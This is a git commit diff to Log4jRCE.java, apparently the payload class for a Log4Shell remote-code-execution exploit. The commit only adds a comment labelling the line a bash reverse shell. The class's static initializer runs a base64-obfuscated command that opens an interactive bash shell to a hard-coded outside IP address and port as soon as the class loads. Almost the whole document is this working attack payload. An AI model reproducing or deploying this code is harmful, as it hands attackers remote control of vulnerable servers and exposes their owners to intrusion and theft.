cbe57ac57347dcd9a9ae6a3853db3c20a2c4993a
lfz <75104414+lfz97@users.noreply.github.com>
2021-12-21 17:28:21 +0800

    Update Log4jRCE.java

--- src/main/exp/Log4jRCE.java
+++ src/main/exp/Log4jRCE.java
@@ -4,7 +4,7 @@ import java.io.IOException;
 public class Log4jRCE {
     static {
         try {
-            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDIuMTg3LjMxLzM4MzggMD4mMQ==}|{base64,-d}|{bash,-i}");
+            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDIuMTg3LjMxLzM4MzggMD4mMQ==}|{base64,-d}|{bash,-i}");//bash反弹shell
         } catch (IOException e) {
             e.printStackTrace();
         }
